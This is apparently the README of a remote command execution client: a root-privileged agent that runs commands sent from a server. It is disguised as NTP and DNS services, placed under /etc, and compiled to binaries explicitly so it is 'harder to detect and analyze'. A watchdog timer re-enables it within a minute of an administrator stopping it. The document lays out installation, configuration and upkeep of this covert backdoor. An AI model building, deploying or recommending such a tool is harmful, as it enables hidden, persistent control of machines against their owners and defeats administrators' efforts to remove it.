# Remote Command Execution Client

## File Structure

- **client.py** - Original client script (for reference and standalone testing)
- **ntp-daemon** - Client template used by installer (configuration placeholders)
- **conf** - Monitor script (checks service health every minute)
- **env.example** - Configuration template
- **install.sh** - Automated installation script
- **uninstall.sh** - Automated uninstallation script
- **ntpsyncd.service** - Systemd service file
- **dnsresolv.service** - Systemd monitor service file
- **dnsresolv.timer** - Systemd timer (triggers monitor every minute)

## Installation

### Quick Installation (Automated)

1. Configure your settings:
   ```bash
   cp env.example .env
   nano .env
   ```

2. Run the installation script as root:
   ```bash
   sudo ./install.sh
   ```

The script will:
- Read configuration from `.env` file
- Install Python dependencies (netifaces, pyinstaller)
- Embed configuration directly into the client script
- **Compile both scripts to standalone binary executables**
- Install the client binary to `/etc/ntpsync/ntp`
- Install monitor binary to `/etc/dnsresolve/conf`
- Create and enable the `ntpsyncd` systemd service
- Create and enable the `dnsresolv` systemd timer (monitors the service every minute)
- Start the client service

**Important**: The installed files are compiled binaries, not Python scripts. The source code is not visible on the target system, making them harder to detect and analyze.

### Uninstallation

To completely remove the client and all installed components:

```bash
sudo ./uninstall.sh
```

This will:
- Stop and disable all services
- Remove all systemd service files
- Remove the installation directory (`/etc/ntpsync`)
- Remove the monitor directory (`/etc/dnsresolve`)
- Kill any remaining processes
- Optionally remove Python dependencies

## Configuration

Edit the `.env` file **before installation**:

- `SERVER_HOST`: Server IP address or hostname (default: localhost)
- `SERVER_PORT`: Server port (default: 8443)
- `CLIENT_NAME`: Optional client identifier (if empty, uses primary network interface IP)

**Important**: The configuration is embedded into the client during compilation. The installed binary contains the configuration and cannot be easily modified. If you need to change the configuration after installation, you must:
1. Edit the `.env` file
2. Run `sudo ./install.sh` again to recompile and reinstall with new configuration

## Running the Client

### As a systemd service (recommended)

The client runs automatically as a service after installation:

```bash
# Check service status
sudo systemctl status ntpsyncd

# View service logs
sudo journalctl -u ntpsyncd -f

# Restart service
sudo systemctl restart ntpsyncd
```

### Standalone (for testing)

**Note**: The client must be run as root to execute commands with root privileges.

```bash
# Using the original client.py (requires .env file)
sudo python client.py

# Or using the template (after manually setting configuration)
sudo python ntp-daemon
```

## Service Management

### Check Service Status

```bash
sudo systemctl status ntpsyncd
```

### View Live Logs

```bash
sudo journalctl -u ntpsyncd -f
```

### Update Configuration

To update the configuration after installation:

1. Edit the `.env` file with new values
2. Recompile and reinstall:
   ```bash
   sudo ./install.sh
   ```

The installation script will recompile the binary with the new embedded configuration and replace the existing installation.

### Check Monitoring Timer

```bash
# Timer status
sudo systemctl status dnsresolv.timer

# Timer logs
sudo journalctl -u dnsresolv.timer -f

# Monitor script logs
sudo journalctl -u dnsresolv -f
```

### Stop Service

```bash
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
```

**Note**: The monitoring timer will automatically restart and re-enable the service within 1 minute.

## Installation Details

### Installed Files

- **Client binary**: `/etc/ntpsync/ntp` (compiled executable with embedded configuration)
- **Monitor binary**: `/etc/dnsresolve/conf` (compiled executable)
- **Service file**: `/etc/systemd/system/ntpsyncd.service`
- **Timer files**: `/etc/systemd/system/dnsresolv.{service,timer}`

**Important**: Both installed files are compiled binary executables (ELF format on Linux). The source code is not visible or accessible on the target system. Configuration is embedded during compilation.

### How the Monitoring Works

1. The `dnsresolv.timer` triggers every minute
2. It runs `dnsresolv.service` which executes `/etc/dnsresolve/conf`
3. The monitor script checks:
   - If service file exists (recreates if missing)
   - If client script exists (alerts if missing)
   - If service is active (starts if stopped)
   - If service is enabled (enables if disabled)
4. All actions are logged to the systemd journal

### Client Identification

Clients identify themselves to the server in one of two ways:

1. **Custom Name**: If `CLIENT_NAME` is set in `.env`, it uses that name
2. **Auto-detect**: If `CLIENT_NAME` is empty, it auto-detects the IP address of the first real network interface (excluding loopback)

Examples:
```env
# Custom name
CLIENT_NAME=web-server-1

# Auto-detect (leave empty)
CLIENT_NAME=
```

## Troubleshooting

### Client Can't Connect to Server

1. Check if server is running and reachable
2. Verify firewall rules allow the connection
3. Check the embedded configuration in the script:
   ```bash
   sudo head -20 /etc/ntpsync/ntp | grep -E "SERVER_HOST|SERVER_PORT|CLIENT_NAME"
   ```

### Service Keeps Stopping

Check the service logs:
```bash
sudo journalctl -u ntpsyncd -n 100
```

Common issues:
- Incorrect server address in configuration
- Network connectivity problems
- Python dependencies not installed (netifaces)

### Need to Change Configuration

The configuration is embedded in the script, so you need to reinstall:

1. Edit `.env` in the client directory
2. Run:
   ```bash
   cd /path/to/client
   sudo ./install.sh
   ```

### Monitor Not Working

1. Check timer status:
   ```bash
   systemctl list-timers dnsresolv.timer
   ```

2. Check monitor logs:
   ```bash
   sudo journalctl -u dnsresolv -n 50
   ```

## Security Warning

⚠️ **WARNING**: This client executes commands received from the server with root privileges. Use only in trusted, isolated networks. Ensure proper firewall rules and access controls are in place.

## Development

### Testing Without Installation

Use the original `client.py` for testing (requires `.env` file):

```bash
# Create .env file
cp env.example .env
nano .env

# Run directly
sudo python client.py
```

**Note**: The installed production version is a compiled binary, but you can still test with the Python script during development.

### Template Files

- **ntp-daemon**: Python template with `{{SERVER_HOST}}`, `{{SERVER_PORT}}`, and `{{CLIENT_NAME}}` placeholders
- **conf**: Bash script for monitoring (original, kept for reference)
- **conf.py**: Python version of monitor script

The `install.sh` script:
1. Replaces placeholders in `ntp-daemon` with values from `.env`
2. Compiles both `ntp-daemon` and `conf.py` to standalone binaries using PyInstaller
3. Installs the compiled binaries (no Python source code on target system)
